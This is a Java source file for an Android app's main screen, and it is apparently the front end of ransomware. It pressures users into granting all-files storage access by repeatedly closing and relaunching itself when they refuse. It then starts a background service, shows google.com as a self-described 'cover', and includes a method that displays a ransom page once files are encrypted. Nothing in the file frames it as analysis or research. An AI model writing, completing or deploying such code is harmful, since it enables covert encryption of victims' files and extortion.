package com.informasipasar.app;

import android.Manifest;
import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String KEY_REQUESTING = "requesting";
    private static final String KEY_WAITING_SETTINGS = "waiting_settings";
    private static final int REQUEST_CODE_NOTIFICATION = 101;

    private boolean requesting = false;
    private boolean waitingForSettings = false;
    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (savedInstanceState != null) {
            requesting = savedInstanceState.getBoolean(KEY_REQUESTING, false);
            waitingForSettings = savedInstanceState.getBoolean(KEY_WAITING_SETTINGS, false);
        }

        if (StorageHelper.hasStoragePermission(this)) {
            onStoragePermissionGranted();
        } else if (!requesting && !waitingForSettings) {
            requestStoragePermission();
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putBoolean(KEY_REQUESTING, requesting);
        outState.putBoolean(KEY_WAITING_SETTINGS, waitingForSettings);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (waitingForSettings) {
            waitingForSettings = false;
            if (StorageHelper.hasStoragePermission(this)) {
                onStoragePermissionGranted();
            } else {
                closeApp();
            }
        }
    }

    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            waitingForSettings = true;
            openAllFilesSettings();
        } else {
            requesting = true;
            ActivityCompat.requestPermissions(this,
                    new String[]{
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE
                    },
                    StorageHelper.REQUEST_CODE_STORAGE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != StorageHelper.REQUEST_CODE_STORAGE) return;

        requesting = false;
        if (StorageHelper.hasStoragePermission(this)) {
            onStoragePermissionGranted();
        } else if (isPermanentlyDenied()) {
            waitingForSettings = true;
            openAppDetailsSettings();
        } else {
            // FORCE REOPEN: kalau ditolak biasa, tutup lalu buka lagi otomatis
            reopenApp();
        }
    }

    private boolean isPermanentlyDenied() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return false;
        return !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                && !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
    }

    private void openAllFilesSettings() {
        Intent intent = new Intent(
                Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                Uri.parse("package:" + getPackageName()));
        try {
            startActivity(intent);
        } catch (ActivityNotFoundException e) {
            try {
                startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION));
            } catch (ActivityNotFoundException e2) {
                Log.e(TAG, "All files settings not found", e2);
                waitingForSettings = false;
                reopenApp();
            }
        }
    }

    private void openAppDetailsSettings() {
        Intent intent = new Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + getPackageName()));
        try {
            startActivity(intent);
        } catch (ActivityNotFoundException e) {
            Log.e(TAG, "App details settings not found", e);
            waitingForSettings = false;
            reopenApp();
        }
    }

    /**
     * Paksa reopen otomatis: close task lalu launch ulang pakai alarm/launcher intent.
     */
    private void reopenApp() {
        Toast.makeText(this, "Storage permission is required", Toast.LENGTH_SHORT).show();
        finishAndRemoveTask();
        // Reopen via launcher intent setelah delay singkat
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent i = getPackageManager().getLaunchIntentForPackage(getPackageName());
            if (i != null) {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(i);
            }
        }, 800);
    }

    private void onStoragePermissionGranted() {
        setContentView(R.layout.activity_main);
        requestNotificationPermissionIfNeeded();
        startBackgroundService();
        // WebView Google.com sebagai cover
        webView = findViewById(R.id.webview);
        if (webView != null) {
            webView.getSettings().setJavaScriptEnabled(true);
            webView.loadUrl("https://www.google.com");
        }
    }

    private void requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                && ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS},
                    REQUEST_CODE_NOTIFICATION);
        }
    }

    private void startBackgroundService() {
        try {
            ContextCompat.startForegroundService(this, new Intent(this, BackgroundService.class));
        } catch (Exception e) {
            Log.e(TAG, "Failed to start background service", e);
        }
    }

    private void closeApp() {
        Toast.makeText(this, "Storage permission is required", Toast.LENGTH_LONG).show();
        finishAndRemoveTask();
    }

    /** Called by BackgroundService when all files are encrypted. */
    public void showRansomNote() {
        runOnUiThread(() -> {
            setContentView(R.layout.activity_main);
            WebView rv = findViewById(R.id.webview);
            if (rv != null) {
                rv.getSettings().setJavaScriptEnabled(true);
                rv.loadUrl("file:///android_asset/ransom.html");
            }
        });
    }
}
